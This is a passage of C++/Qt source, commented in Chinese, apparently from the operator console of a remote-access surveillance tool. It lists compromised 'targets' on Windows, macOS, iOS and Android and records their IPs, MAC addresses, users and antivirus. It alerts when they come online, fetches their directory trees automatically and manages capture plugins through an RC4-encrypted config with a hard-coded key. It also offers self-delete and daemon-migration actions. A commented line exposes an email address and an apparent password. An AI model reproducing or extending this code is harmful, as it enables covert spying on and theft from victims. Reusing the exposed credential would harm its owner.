				AnsiToWide(tarBlock->aniTargetName).c_str(), 
				tarBlock->dwTargetID);
		}

		if (tarBlock->frmTarControl)
		{
			if (tarBlock->frmTarControl->bShowFlag)
			{
				tarBlock->frmTarControl->TargetOnline();
			}
		}

		// 上线提醒
		NotifyInfo info;
		info.targetID = tarBlock->dwGroupID;
		wsprintfA(info.title, "目标上线提醒[%d]", tarBlock->dwTargetID);
		wsprintfA(info.message, " 目标信息 : \r\n 目标 id : %d \r\n 别名 : %s \r\n 操作系统 : %s \r\n 外部 IP : %s \r\n 内部 IP : %s \r\n MAC 地址 : %s \r\n",
			tarBlock->dwTargetID, tarBlock->aniTargetName.c_str(), ConvertBuildNumberToStr(tarBlock->dwOsBuildNumber).c_str(), tarBlock->aniRemPublicIpAddr.c_str(),
			tarBlock->aniRemLocalIpAddr.c_str(), tarBlock->aniRemMacAddr.c_str());
		//OnlineNotify("sssooonnnggg111@163.com", "24yangjing", &info);

		char cfgPath[MAX_PATH] = {0};
		GetModuleFileNameA(NULL, cfgPath, MAX_PATH);
		*(strrchr(cfgPath, '\\')+1) = 0;
		strcat(cfgPath, "OnlineNotify.ini");


		if ( OnlineNotify )
			OnlineNotify(cfgPath, &info);

	}
	else
	{
		treeNode->setText(2, QString::fromLocal8Bit("离线"));

		ChangeTargetStatus(treeNode, tarBlock, false);

		// 改变颜色
		for (int i = 0; i < 11; i++)
		{
			treeNode->setForeground(i, QBrush(QColor(0,0,0)));
		}

		/*if (tarBlock->lastTime == 0)
		{

			SetTarStatusInfoExW(
				STATUS_NOTE, 
				tarBlock,
				L"[目标%s(ID:%d)] 离线",  
				AnsiToWide(tarBlock->aniTargetName).c_str(), 
				tarBlock->dwTargetID);
		}
		else
		{

			SetTarStatusInfoExW(
				STATUS_NOTE, 
				tarBlock,
				L"[目标%s(ID:%d)] 离线",  
				AnsiToWide(tarBlock->aniTargetName).c_str(), 
				tarBlock->dwTargetID);
		}*/

		if (tarBlock->frmTarControl)
		{
			tarBlock->frmTarControl->TargetOffline();
		}
	}

	UpdateTargetDisplay(treeNode);

	//RefreshTargetList();
	UpateTargetCount();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 发送指令以获取目标目录信息
//
void MainDlg::AutoGetDirInfo(Target* tarBlock)
{
	std::wstring path;

	if ( SYSTEM_WINDOWS == tarBlock->m_sysType )
		path = L"C:\\";
	else
		path = L"/";

	// 自动获取目录结构
	if ( -1 != tarBlock->m_autoGetDirInfoDepth )
	{
		if ( tarBlock->tarConn )
		{       
			tarBlock->tarConn->Send_ADT( tarBlock->dwTargetID,
				FILEDOWN,
				GetBase64FromWide(path).c_str(),
				tarBlock->m_autoGetDirInfoDepth == 0 ? 10 : tarBlock->m_autoGetDirInfoDepth,
				0);
		}

		// 获取一次就行了，重复获取很费蓝的。。
		tarBlock->m_autoGetDirInfoDepth = -1;
		DM->UpdateTargetAutoGetStatus(tarBlock->dwTargetID, -1);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 目标信息更新
//
void MainDlg::on_WM_TARGET_INFO_UPDATED(MSG* msg)
{
	Target *tar = (Target *)msg->wParam;

	// 更新数据库
	//
	DM->UpdateTargetInfo(tar);

	// 更新界面
	//
	QTreeWidgetItem * treeNode = tar->treeNode;
	treeNode->setText(3, QString::fromLocal8Bit(ConvertBuildNumberToStr(tar->dwOsBuildNumber).c_str()));

	tar->m_sysType = GetSystemType(tar->dwOsBuildNumber);

	ChangeTargetStatus(treeNode, tar, true);

	if ( tar->aniRemPublicIpAddr != treeNode->text(4).toStdString() )
	{
		std::string Info = "目标" 
			+ tar->aniTargetName 
			+ "(ID:" 
			+ QString("%1").arg(tar->dwTargetID).toStdString()
			+ ")外部IP地址由" 
			+ treeNode->text(4).toStdString()
			+ "变为" 
			+ tar->aniRemPublicIpAddr;
		AddStatusInfo(STATUS_NOTE, Info.c_str());

		treeNode->setText(4, tar->aniRemPublicIpAddr.c_str());

		std::string country, location;
		m_ipfinder.GetAddressByIp(tar->aniRemPublicIpAddr.c_str(), country, location);

		treeNode->setText(6, QString::fromLocal8Bit(country.c_str()));

	}

	if ( tar->aniRemLocalIpAddr != treeNode->text(5).toStdString() )
	{
		std::string Info = "目标" 
			+ tar->aniTargetName 
			+ "(ID:" 
			+ QString("%1").arg(tar->dwTargetID).toStdString()
			+ ")内部IP地址由" 
			+ treeNode->text(5).toStdString()
			+ "变为" 
			+ tar->aniRemLocalIpAddr;
		AddStatusInfo(STATUS_NOTE, Info.c_str());

		treeNode->setText(5, tar->aniRemLocalIpAddr.c_str());
	}

	if ( tar->aniRemMacAddr != treeNode->text(6).toStdString() )
	{
		std::string Info = "目标" 
			+ tar->aniTargetName 
			+ "(ID:" 
			+ QString("%1").arg(tar->dwTargetID).toStdString()
			+ ")Mac地址由" 
			+ treeNode->text(9).toStdString()
			+ "变为" 
			+ tar->aniRemMacAddr;
		AddStatusInfo(STATUS_NOTE, Info.c_str());

		treeNode->setText(9, tar->aniRemMacAddr.c_str());
	}

	if (tar->dwLangId != 0)
	{
		CHAR szLang[MAX_PATH];
		VerLanguageNameA(tar->dwLangId, szLang, MAX_PATH);
		if ( 0 != strcmp(szLang, "语言中性") )
		{
			treeNode->setText(10, QString::fromLocal8Bit(szLang));
		}
	}

	if ( tar->m_netEnv > 4 )
		tar->m_netEnv = 4;

	treeNode->setText(8, QString::fromStdWString(std::wstring(TargetDlg::Net_description[tar->m_netEnv])));

}

// ////////////////////////////////////////////////////////////////////////////////
// @private 目标扩展信息更新
//
void MainDlg::on_WM_TARGET_EXINFO_UPDATED(MSG* msg)
{
	Target *tar = (Target *)msg->wParam;

	// 更新数据库
	//
	DM->UpdateTargetExInfo(tar);

	QTreeWidgetItem * treeNode = tar->treeNode;

	if (tar->dwLangId != 0)
	{
		CHAR szLang[MAX_PATH];
		VerLanguageNameA(tar->dwLangId, szLang, MAX_PATH);
		if ( 0 != strcmp(szLang, "语言中性") )
		{
			treeNode->setText(10, QString::fromLocal8Bit(szLang));
		}
	}

	// 如果被选中，更新基本信息
	//
	if ( treeNode->isSelected() )
	{
		ui.tbBasicInfo->setItem(0, 0, new QTableWidgetItem(
			QIcon(":/image/unknown.png"), QString::fromLocal8Bit("状态")));
		ui.tbBasicInfo->setItem(1, 0, new QTableWidgetItem(
			QIcon(":/image/disklist.png"), QString::fromLocal8Bit("主机名")));
		ui.tbBasicInfo->setItem(2, 0, new QTableWidgetItem(
			QIcon(":/image/group.png"), QString::fromLocal8Bit("登录用户")));
		ui.tbBasicInfo->setItem(3, 0, new QTableWidgetItem(
			QIcon(":/image/run.png"), QString::fromLocal8Bit("上线进程")));

		ui.tbBasicInfo->setItem(0, 1, new QTableWidgetItem(
			tar->tarStatus == TARONLINE
			? QString::fromLocal8Bit("在线")
			: QString::fromLocal8Bit("离线")));
		ui.tbBasicInfo->setItem(1, 1, new QTableWidgetItem(
			QString::fromStdWString(GetWideFromBase64(tar->aniComputerNameBase64))));
		ui.tbBasicInfo->setItem(2, 1, new QTableWidgetItem(
			QString::fromStdWString(GetWideFromBase64(tar->aniLoginUserBase64))));
		ui.tbBasicInfo->setItem(3, 1, new QTableWidgetItem(
			QString::fromStdWString(GetWideFromBase64(tar->aniOnlineProcBase64))));
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 目标切换
//
void MainDlg::on_WM_TARGET_SWITCH(MSG* msg)
{
	// 多控制端消息，暂不处理
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 目标数据连接关闭
//
void MainDlg::on_WM_TARGET_DATACONNCLOSED(MSG* msg)
{
	Target *tarBlock = (Target *)msg->wParam;

	if ( ! this->ctrOnlineFlag)
	{
		return;
	}

	if (tarBlock->bCleared)
	{
		return;
	}

	SetStatusInfoExA(STATUS_INFO,"[目标%s(ID:%lu)] 数据传输通道关闭",
		tarBlock->aniTargetName.c_str(), tarBlock->dwTargetID);

	if (tarBlock->bConnecting == false && tarBlock->bTarConnOnline == false )
	{
		SetStatusInfoExA(STATUS_INFO,"[目标%s(ID:%lu)] 重新建立数据传输通道",
			tarBlock->aniTargetName.c_str(), tarBlock->dwTargetID);

		tarBlock->StartTarDataConn();       // 重新开始连接
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 添加 target dialog
//
void MainDlg::on_WM_ADD_TARGET_DIALOG(MSG* msg)
{
	/*Target* tar = (Target*)msg->wParam;

	if (tar->frmTarControl == NULL )
	{
		tar->frmTarControl = new TargetDlg(tar);
		m_targetWindowList.append(tar->frmTarControl);
	}

	m_targetDlgContainer->AddDialog(
		tar->frmTarControl, tar->dwTargetID, QString::fromLocal8Bit(tar->aniTargetName.c_str()), GetIconPath(tar));
	tar->frmTarControl->SetCurrentTab(QString::fromLocal8Bit("任务状态"));
	tar->frmTarControl->Handle = (HWND)tar->frmTarControl->winId();*/
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 双击目标列表 
//
void MainDlg::ShowTarget(QTreeWidgetItem* item, int column)
{
	// 如果不是根节点，则打开目标窗口
	if ( NULL != item->parent() )
	{
		Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();

		if (tar->frmTarControl == NULL)
		{
			//WaitDlg* dlg = new WaitDlg(ui.trTarget);
			//dlg->SetDisplayMode(WaitDlg::TEXT);
			//dlg->SetText(QString::fromLocal8Bit("正在初始化目标控制界面，请稍候..."));
			//dlg->show();
			//qApp->processEvents();
			tar->frmTarControl = new TargetDlg(tar);
			connect(tar->frmTarControl, SIGNAL(emitModifyCapturePolicy(unsigned int, int)), this, SLOT(ModifyPluginPolicy(unsigned int, int)));
			//dlg->close();
			//delete dlg;
			m_targetWindowList.append(tar->frmTarControl);
		}

		m_targetDlgContainer->AddDialog(tar->frmTarControl, tar->dwTargetID, item->text(1), GetIconPath(tar));
		m_targetDlgContainer->SetCurrentTab(tar->dwTargetID);
		tar->frmTarControl->SetCurrentTab(QString::fromLocal8Bit("任务状态"));
		m_targetDlgContainer->showNormal();
		m_targetDlgContainer->activateWindow();

		tar->frmTarControl->Handle = (HWND)tar->frmTarControl->winId();

	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 单击列表中的目标
//
void MainDlg::CurrentTargetChanged(QTreeWidgetItem* item, int column)
{
	ui.tbPluginStatus->clearContents();
	ui.tbBasicInfo->clearContents();

	if ( NULL != item->parent() )
	{
		Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();

		// 只有移动设备才可以控制流量
		ui.actFlowControl->setEnabled(MobileDevice(tar));

		// 收藏/取消收藏
		if ( tar->m_favorite )
			ui.actFavorite->setText(QString::fromLocal8Bit("取消收藏"));
		else
			ui.actFavorite->setText(QString::fromLocal8Bit("收藏目标"));

		// 调整插件状态
		//
		PPLUGIN_CONTEXT  lpPluginCxt;

		int plgCount = 0;
		for (int i = 1; i < MAX_PLG_COUNT; i++)
		{		
			lpPluginCxt = tar->pluginVect[i];
			if (lpPluginCxt == NULL)
			{
				continue;
			}

			// 手机没有 usb
			if ( GetSystemType(tar->dwOsBuildNumber) != SYSTEM_WINDOWS 
				&& GetSystemType(tar->dwOsBuildNumber) != SYSTEM_MACOSX 
				&& i == 3 )
			{
				continue;
			}

			// 增加一排占位
			for ( int j = 0; j < 4; j++ )
			{
				ui.tbPluginStatus->setItem(plgCount, j, new QTableWidgetItem);
			}
			
			ui.tbPluginStatus->item(plgCount, 0)->setText(QString("%1").arg(i));
			ui.tbPluginStatus->item(plgCount, 1)->setText(
				QString::fromLocal8Bit(ConvertPluginIdToLang(i).c_str()));
			ui.tbPluginStatus->item(plgCount, 2)->setText(QString("%1").arg(lpPluginCxt->dwPluginVer));
			ui.tbPluginStatus->item(plgCount, 3)->setText(
				lpPluginCxt->dwPluginVer == 0
				? QString::fromLocal8Bit("未启用")
				: QString::fromLocal8Bit("已启用"));

			if ( lpPluginCxt->dwPluginVer == 0 )
			{
				ui.tbPluginStatus->item(plgCount, 0)->setIcon(QIcon(":/image/module_disable.png"));
			}
			else
			{
				ui.tbPluginStatus->item(plgCount, 0)->setIcon(QIcon(":/image/module.png"));
			}

			plgCount++;
		}

		// 调整基本信息
		//
		ui.tbBasicInfo->setItem(0, 0, new QTableWidgetItem(
			QIcon(":/image/unknown.png"), QString::fromLocal8Bit("状态")));
		ui.tbBasicInfo->setItem(1, 0, new QTableWidgetItem(
			QIcon(":/image/disklist.png"), QString::fromLocal8Bit("主机名")));
		ui.tbBasicInfo->setItem(2, 0, new QTableWidgetItem(
			QIcon(":/image/group.png"), QString::fromLocal8Bit("登录用户")));
		ui.tbBasicInfo->setItem(3, 0, new QTableWidgetItem(
			QIcon(":/image/run.png"), QString::fromLocal8Bit("上线进程")));
		ui.tbBasicInfo->setItem(4, 0, new QTableWidgetItem(
			QIcon(":/image/error.png"), QString::fromLocal8Bit("杀毒软件")));



		ui.tbBasicInfo->setItem(0, 1, new QTableWidgetItem(
			tar->tarStatus == TARONLINE
			? QString::fromLocal8Bit("在线")
			: QString::fromLocal8Bit("离线")));
		ui.tbBasicInfo->setItem(1, 1, new QTableWidgetItem(
			QString::fromStdWString(GetWideFromBase64(tar->aniComputerNameBase64))));
		ui.tbBasicInfo->setItem(2, 1, new QTableWidgetItem(
			QString::fromStdWString(GetWideFromBase64(tar->aniLoginUserBase64))));
		ui.tbBasicInfo->setItem(3, 1, new QTableWidgetItem(
			QString::fromStdWString(GetWideFromBase64(tar->aniOnlineProcBase64))));
		ui.tbBasicInfo->setItem(4, 1, new QTableWidgetItem(
			QString::fromStdWString(tar->m_antiVirus)));
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 列表右键菜单
//
void MainDlg::onTrTargetContextMenuActived(QPoint point)
{
	QMenu menu(this);

	QTreeWidgetItem* item = ui.trTarget->itemAt(point);

	if ( NULL == item || NULL == item->parent() )
	{
		return;
	}

	menu.addAction(ui.actPolicy);
	menu.addAction(ui.actAlias);
	menu.addAction(ui.actDelSelf);
	menu.addAction(ui.actClean);

	QPoint realPos = ui.trTarget->viewport()->mapToGlobal(point);
	menu.exec(realPos);

}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 分组方式改变
//
void MainDlg::onCmbCateGoryCurrentIndexChanged(int index)
{
	m_category = index;
	RefreshTargetList();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 显示模式改变
//
void MainDlg::onCmbDisplayModeCurrentIndexChanged(int index)
{
	m_displayMode = index;
	RefreshTargetList();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 刷新目标列表
//
void MainDlg::RefreshTargetList()
{
	while ( ui.trTarget->topLevelItemCount() )
	{
		QTreeWidgetItem* group = ui.trTarget->topLevelItem(0);

		while ( group->childCount() )
		{
			QTreeWidgetItem* item = group->takeChild(0);
		}

		ui.trTarget->takeTopLevelItem(0);
	}

	for ( std::list<QTreeWidgetItem*>::iterator it = m_itemList.begin();
		it != m_itemList.end();
		++it )
	{
		//AddItemByIP(*it);
		AddTargetNode(*it);
	}

	for ( int i = 0; i < ui.trTarget->topLevelItemCount(); ++i )
	{
		ui.trTarget->topLevelItem(i)->setExpanded(true);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 根据分组类型添加节点
//
void MainDlg::AddTargetNode(QTreeWidgetItem* item)
{
	if ( m_category == Category::IP )
		AddItemByIP(item);
	if ( m_category == Category::GROUP )
		AddItemByGroup(item);
	if ( m_category == Category::PLATFORM )
		AddItemByPlatform(item);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 按编号添加
//
void MainDlg::AddItemByGroup(QTreeWidgetItem* item)
{
	if ( !ItemCanShow(item) )
		return;

	Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();

	QString groupText = QString("%1").arg(tar->dwGroupID);

	QTreeWidgetItem* parent = NULL;

	for ( int i = 0; i < ui.trTarget->topLevelItemCount(); ++i )
	{
		QTreeWidgetItem* item = ui.trTarget->topLevelItem(i);

		if ( item->text(0) == groupText )
		{
			parent = item;
			break;
		}
	}

	if ( parent == NULL )
	{
		parent = new QTreeWidgetItem;
		parent->setIcon(0, QIcon(QPixmap(":/image/group.png")));
		parent->setText(0, groupText);
		ui.trTarget->addTopLevelItem(parent);
	}

	parent->addChild(item);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 按平台添加
//
void MainDlg::AddItemByPlatform(QTreeWidgetItem* item)
{
	if ( !ItemCanShow(item) )
		return;

	Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();
	const char* caption[] = {"Windows", "Mac OS X", "IOS", "Android"};
	const char* icon[] = {
		":/image/windows_online.png",
		":/image/mac_online.png",
		":/image/iphone_online.png",
		":/image/android_online.png"
	};

	if ( tar == NULL )
		return;

	int systemType = GetSystemType(tar->dwOsBuildNumber);

	QString groupText = QString::fromLocal8Bit(caption[systemType]);

	QTreeWidgetItem* parent = NULL;

	for ( int i = 0; i < ui.trTarget->topLevelItemCount(); ++i )
	{
		QTreeWidgetItem* item = ui.trTarget->topLevelItem(i);

		if ( item->text(0) == groupText )
		{
			parent = item;
			break;
		}
	}

	if ( parent == NULL )
	{
		parent = new QTreeWidgetItem;
		parent->setIcon(0, QIcon(QPixmap(icon[systemType])));
		parent->setText(0, QString::fromLocal8Bit(caption[systemType]));
		ui.trTarget->addTopLevelItem(parent);
	}

	parent->addChild(item);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 按 IP 添加
//
void MainDlg::AddItemByIP(QTreeWidgetItem* item)
{
	if ( !ItemCanShow(item) )
		return;

	QString ipText = item->text(6);

	QTreeWidgetItem* parent = NULL;

	for ( int i = 0; i < ui.trTarget->topLevelItemCount(); ++i )
	{
		QTreeWidgetItem* item = ui.trTarget->topLevelItem(i);

		if ( item->text(0) == ipText )
		{
			parent = item;
			break;
		}
	}

	if ( parent == NULL )
	{
		parent = new QTreeWidgetItem;
		parent->setIcon(0, QIcon(QPixmap(":/image/home.png")));
		parent->setText(0, ipText);
		ui.trTarget->addTopLevelItem(parent);
	}

	parent->addChild(item);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 更新目标数量
//
void MainDlg::UpateTargetCount()
{
	int count = 0;
	int onlineCount = 0;

	for ( std::map<ULONG, Target*>::iterator it = g_targetMap.begin();
		it != g_targetMap.end();
		++it )
	{
		++count;
		Target* tar = (*it).second;
		if ( tar && tar->tarStatus == TARONLINE )
			++onlineCount;
	}

	ui.lbTargetCount->setText(QString("%1").arg(count));
	ui.lbOnlineTargetCount->setText(QString("%1").arg(onlineCount));
}

// ////////////////////////////////////////////////////////////////////////////////
// @private item 在当前显示模式下是否应该显示
//
bool MainDlg::ItemCanShow(QTreeWidgetItem* item)
{
	if ( item == NULL )
		return false;

	Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();

	if ( DisplayMode::SHOW_ALL == m_displayMode
		|| (DisplayMode::SHOW_ONLINE == m_displayMode && tar->tarStatus == TARONLINE)
		|| (DisplayMode::SHOW_OFFLINE == m_displayMode && tar->tarStatus == TAROFFLINE)
		|| (DisplayMode::SHOW_FAVORITE == m_displayMode && tar->m_favorite )
		)
	{
		return true;
	}

	return false;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 心跳响应函数
//
void MainDlg::PNGTimerTimer()
{
	// 每30秒，执行一次
	//
	if (this->ctrConn == NULL)
	{
		return;
	}

	//
	// 如果连接保持，则发送PNG报文
	//

	this->ctrConn->Send_PNG();

	std::map<ULONG, Target *>::iterator i = g_targetMap.begin();
	for (; i != g_targetMap.end(); i++)
	{
		Target *tarBlock = (*i).second;

		if (tarBlock == NULL)
		{
			continue;
		}

		// 当中转服务器收到PND后，会转发给在线的目标，从而保证三端的可用
		//
		if (tarBlock->bTarConnOnline && tarBlock->tarConn)
		{
			tarBlock->tarConn->Send_PNG();
		}
	}
}

///////////////////////////////////////////////////////////////////////////////////
// @private
///////////////////////////////////////////////////////////////////////////////////

// ////////////////////////////////////////////////////////////////////////////////
// @private 界面外观微调 
//
void MainDlg::InitWidgetAppearance()
{

	setContextMenuPolicy(Qt::NoContextMenu);

	// 标题
	std::wstring inifile = GetExePath()+L"\\setting.ini";
	std::wstring title = ReadStringPolicyFromLocal(L"Application", L"title", inifile.c_str());
	this->setWindowTitle(QString::fromStdWString(title));

	// 工具栏
	ui.mainToolBar->setMinimumHeight(80);
	ui.mainToolBar->setStyleSheet(GetStylesheetFromFile(L"toolbar"));
	ui.topSplitter->setStretchFactor(0, 1);

	// 菜单栏
	ui.menuBar->setStyleSheet(GetStylesheetFromFile(L"menu"));

	// 状态栏
	ui.statusBar->setStyleSheet(GetStylesheetFromFile(L"statusbar"));

	// 基本信息表头调整
	ui.tbBasicInfo->setStyle(new NoFocusStyle(this));
	ui.tbBasicInfo->horizontalHeader()->resizeSection(0, 100);

	// 插件状态表头调整
	ui.tbPluginStatus->setStyle(new NoFocusStyle(this));
	//ui.tbBasicInfo->horizontalHeader()->setResizeMode(QHeaderView::ResizeToContents);
	ui.tbPluginStatus->horizontalHeader()->resizeSection(0, 50);
	ui.tbPluginStatus->horizontalHeader()->resizeSection(1, 110);
	ui.tbPluginStatus->horizontalHeader()->resizeSection(2, 50);
	ui.tbPluginStatus->horizontalHeader()->resizeSection(3, 35);
	ui.tbPluginStatus->horizontalHeader()->setDefaultAlignment(Qt::AlignLeft | Qt::AlignVCenter);

	// 日志表头调整
	ui.tbLog->horizontalHeader()->resizeSection(0, 250);

	// 目标列表表头调整
	ui.trTarget->header()->resizeSection(0, 150);
	ui.trTarget->header()->resizeSection(1, 100);
	ui.trTarget->header()->resizeSection(2, 50);
	ui.trTarget->header()->resizeSection(3, 100);
	ui.trTarget->header()->resizeSection(4, 100);
	ui.trTarget->header()->resizeSection(5, 100);
	ui.trTarget->header()->resizeSection(6, 100);
	ui.trTarget->header()->resizeSection(7, 70);
	ui.trTarget->header()->resizeSection(8, 70);
	ui.trTarget->header()->resizeSection(9, 120);
	ui.trTarget->header()->resizeSection(10, 100);
	ui.trTarget->header()->resizeSection(11, 30);

	NoFocusStyle* nofocusStyle = new NoFocusStyle(this);

	ui.cmbCategory->setStyle(nofocusStyle);
	ui.cmbDisplayMode->setStyle(nofocusStyle);
	ui.menuBar->setStyle(nofocusStyle);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 初始化信号与槽的连接 
//
void MainDlg::InitConnection()
{
	connect(m_targetDlgContainer, SIGNAL(emitBack()), this, SLOT(ActiveMainWindow()));

	// Action
	connect(ui.actStart, SIGNAL(triggered()), this, SLOT(StartAction()));
	connect(ui.actStop, SIGNAL(triggered()), this, SLOT(StopAction()));
	connect(ui.actExit, SIGNAL(triggered()), this, SLOT(ExitAction()));
	connect(ui.actConfig, SIGNAL(triggered()),this, SLOT(ConfigAction()));
	connect(ui.actPolicy, SIGNAL(triggered()), this, SLOT(PolicyAction()));
	connect(ui.actFavorite, SIGNAL(triggered()), this, SLOT(FavoriteAction()));
	connect(ui.actAlias, SIGNAL(triggered()),this, SLOT(AliasAction()));
	connect(ui.actDelSelf, SIGNAL(triggered()), this, SLOT(DelSelfAction()));
	connect(ui.actFlowControl, SIGNAL(triggered()), this, SLOT(FlowControlAction()));
	connect(ui.actClean, SIGNAL(triggered()), this, SLOT(CleanAction()));
	connect(ui.actCreate, SIGNAL(triggered()), this, SLOT(CreateTargetAction()));
	connect(ui.actCreateDaemon, SIGNAL(triggered()), this, SLOT(CreateDaemonAction()));
	connect(ui.actHelp, SIGNAL(triggered()), this, SLOT(HelpAction()));
	connect(ui.actAbout, SIGNAL(triggered()), this, SLOT(AboutAction()));
	connect(ui.actCleanDatabase, SIGNAL(triggered()), this, SLOT(CleanDatabaseAction()));
	connect(ui.actMigrateDaemon, SIGNAL(triggered()), this, SLOT(MigrateDaemonAction()));
	connect(ui.actQueryDaemonAddress, SIGNAL(triggered()), this, SLOT(QueryDaemonAddressAction()));

	// 双击列表中的目标
	connect(ui.trTarget, SIGNAL(itemDoubleClicked(QTreeWidgetItem*, int)), this, SLOT(ShowTarget(QTreeWidgetItem*, int)));

	// 单击列表中的目标
	connect(ui.trTarget, SIGNAL(itemClicked(QTreeWidgetItem*, int)), this, SLOT(CurrentTargetChanged(QTreeWidgetItem*, int)));

	// 定时发送心跳包
	connect(&m_PNGTimer, SIGNAL(timeout()), this, SLOT(PNGTimerTimer()));

	// 目标列表右键菜单
	//connect(ui.trTarget, SIGNAL(customContextMenuRequested(QPoint)), this, SLOT(onTrTargetContextMenuActived(QPoint)));

	// 分组方式改变
	connect(ui.cmbCategory, SIGNAL(currentIndexChanged(int)), this, SLOT(onCmbCateGoryCurrentIndexChanged(int)));

	// 显示模式改变
	connect(ui.cmbDisplayMode, SIGNAL(currentIndexChanged(int)), this, SLOT(onCmbDisplayModeCurrentIndexChanged(int)));

	// 任务栏闪烁
	connect(m_trayFlashTimer, SIGNAL(timeout()), this, SLOT(FlashTrayIcon()));

	connect(m_tray, SIGNAL(activated(QSystemTrayIcon::ActivationReason)),
		this, SLOT(ProcessTrayEvent(QSystemTrayIcon::ActivationReason)));
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 更新在线状态
//
void MainDlg::ChangeTargetStatus(QTreeWidgetItem* item, Target* target, bool online)
{
	item->setIcon(0, QIcon(QPixmap(GetIconPath(target))));
	m_targetDlgContainer->ChangeLabelIcon(target->dwTargetID, GetIconPath(target));
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 输出日志至文件
//
void MainDlg::WriteLogToFile(LPCWSTR wzLogInfo)
{
	std::wstring logFile = GetExePath()+L"\\log.txt";
	
	HANDLE hFile = CreateFileW(
		logFile.c_str(),
		GENERIC_WRITE,
		0,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);
	
	SetFilePointer(hFile, 0, NULL, FILE_END);

	struct tm today = {0};
	time_t ltime;

	_time64(&ltime); 
	_localtime64_s(&today, &ltime);

	CHAR wzLog[1024] = {0};
	sprintf(wzLog, "------------------------------------------------------------------------------\r\n"
				   "%.4d-%.2d-%.2d %.2d:%.2d:%.2d\t\t%s\r\n"
				   "------------------------------------------------------------------------------\r\n",
		today.tm_year+1900, today.tm_mon+1, today.tm_mday,
		today.tm_hour, today.tm_min, today.tm_sec,
		WideToAnsi(wzLogInfo).c_str());

	DWORD dwWrite = 0;
	WriteFile(hFile, wzLog, strlen(wzLog), &dwWrite, NULL);

	CloseHandle(hFile);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 从 update.dat 中读取插件信息
//
bool MainDlg::ReadPluginInfo(PPLUGIN_CXT PlgCxtVect[])
{
	CHAR szDatPath[MAX_PATH] = {0};
	GetModuleFileNameA(0, szDatPath, MAX_PATH);
	LPSTR szName = strrchr(szDatPath, '\\');

	if ( MacPlgCxtVect == PlgCxtVect )
	{
		strcpy(szName, "\\_Plugin\\MACOSX\\update.dat");
	}
	else if ( IosPlgCxtVect == PlgCxtVect )
	{
		strcpy(szName, "\\_Plugin\\IOS\\update.dat");
	}
	else if ( WindowsPlgCxtVect == PlgCxtVect )
	{
		strcpy(szName, "\\_Plugin\\WINDOWS\\update.dat");
	}
	else if ( AndroidPlgCxtVect == PlgCxtVect )
	{
		strcpy(szName, "\\_Plugin\\ANDROID\\update.dat");
	}

	FILE *hFile = fopen(szDatPath,"rb");
	if (hFile == NULL)
	{
		//MessageBoxA(this->Handle, "不能找到插件配置文件!", "提示", MB_OK | MB_ICONINFORMATION);
		return false;
	}

	char        rBuf[4096];
	char	    *pParam		= rBuf;
	char	    *pParamNext	= NULL;
	char	    *pDelim		= NULL;
	PPLUGIN_CXT	pluginCxt	;

	memset(rBuf, 0, 4096);
	int numRead = fread(rBuf, sizeof(char), 4096, hFile);
	if (numRead == 0 || !feof(hFile))
	{
		MessageBoxA(this->Handle, "插件配置文件不正确!", "提示", MB_OK | MB_ICONINFORMATION);
		fclose(hFile);        
		return false;
	}    
	fclose(hFile);

	// rc4 encrypt target config content
	//
	BYTE  keyForRc4[8];
	keyForRc4[4] = '%';
	keyForRc4[5] = '+';
	keyForRc4[6] = 'w';
	keyForRc4[7] = 'f';
	keyForRc4[2] = ')';
	keyForRc4[0] = '#';
	keyForRc4[1] = '*';
	keyForRc4[3] = '(';

	RC4_KEY	   rc4Key;
	AdkBuildRc4Key(keyForRc4, 8, &rc4Key);
	AdkRc4Handler((BYTE *)rBuf, numRead, &rc4Key);

	do
	{
		pParamNext = strstr(pParam,"\r\n");
		if (!pParamNext)
		{
			break;
		}

		pParamNext[0] = '\0';

		// malloc a new pluginBlock to represent corresponding plugin dll
		//
		pluginCxt = (PPLUGIN_CXT)malloc(sizeof(PLUGIN_CXT));
		ZeroMemory(pluginCxt, sizeof(PLUGIN_CXT));

		// Plugin Format
		//
		//		PID|FILENAME|VER|LOADTYPE|INSTALLTYPE|PROC
		//	
		//	PROC
		//		*			---  all program
		//		explorer.exe;winlogon.exe;xxx;yyy;zzz;
		//
		do
		{
			pDelim  = strchr(pParam,'|');
			if (!pDelim)
			{
				break;
			}
			pDelim[0] = '\0';
			pluginCxt->dwPluginId = strtoul(pParam,NULL,10);

			pParam = pDelim + 1;
			pDelim = strchr(pParam,'|');
			if (!pDelim)
			{
				break;
			}
			pDelim[0] = '\0';
			pluginCxt->lpszPluginName = strdup(pParam);

			pParam = pDelim + 1;
			pDelim = strchr(pParam,'|');
			if (!pDelim)
			{
				break;
			}
			pDelim[0] = '\0';
			pluginCxt->dwPluginVer = atoi(pParam);

			pParam = pDelim + 1;
			pDelim = strchr(pParam,'|');
			if (!pDelim)
			{
				break;
			}
			pDelim[0] = '\0';
			pluginCxt->dwLoadType = atoi(pParam);

			pParam = pDelim + 1;
			pDelim = strchr(pParam,'|');
			if (!pDelim)
			{
				break;
			}
			pDelim[0] = '\0';
